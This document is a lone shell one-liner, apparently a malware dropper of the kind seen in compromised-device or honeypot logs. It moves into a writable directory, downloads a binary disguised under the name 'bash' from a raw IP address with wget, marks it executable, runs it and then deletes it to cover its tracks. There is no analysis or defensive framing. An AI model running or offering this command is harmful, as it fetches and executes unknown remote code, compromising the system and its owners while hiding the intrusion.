cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://93.158.200.94/bash; chmod +x bash; ./bash; rm -rf bash
